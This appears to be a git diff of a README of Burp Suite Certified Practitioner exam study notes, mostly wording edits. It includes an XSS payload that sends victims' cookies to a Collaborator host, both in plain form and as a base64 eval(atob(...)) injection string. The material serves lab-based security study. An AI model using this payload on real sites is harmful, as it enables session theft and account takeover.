@@ -1,13 +1,13 @@
 
 # Burp-Suite-Certified-Practitioner-Exam-Study  
 
->My personal study notes on the PortSwigger Academy [Burp Suite Certified Practitioner](https://portswigger.net/web-security/certification) (BSCP) Exam topics. The acronym BSCP has nice simular ring to it, same as OSCP  :)  
+>My study notes on the PortSwigger Academy [Burp Suite Certified Practitioner](https://portswigger.net/web-security/certification) (BSCP) Exam topics. The below BSCP notes may require going to PortSwigger Academy labs to understand my thinking in changing payloads to get require results needed to progress to next stage in exam.  
 
 **[Foothold](#foothold)**  
 [Dom-XSS](#dom-xss-messages)  
 [Web Cache Poison](#web-cache-poison)  
 [Cross Site Scripting](#cross-site-scripting)  
-[Host Header Poison - forgot-password](#host-header-poison---forgot-password)  
+[Host Header Poison](#host-header-poison---forgot-password)  
 [HTTP Request Smuggling](#http-request-smuggling)  
   
 **[Privilege Escalation](#privilege-escalation)**  
@@ -223,11 +223,14 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 ```JavaScript
 fetch("https://Collaborator.oastify.com/?c=" + btoa(document['cookie']))
 ```
-<sup>Base64 encode the payload</sup>
+>Base64 encode the payload.  
+
 ```
 ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk=
-```
-<sub>Test payload on our own session in Search</sub>
+```  
+
+>Test payload on our own session in Search.  
+
 ```JavaScript
 "+eval(atob("ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
 ```  
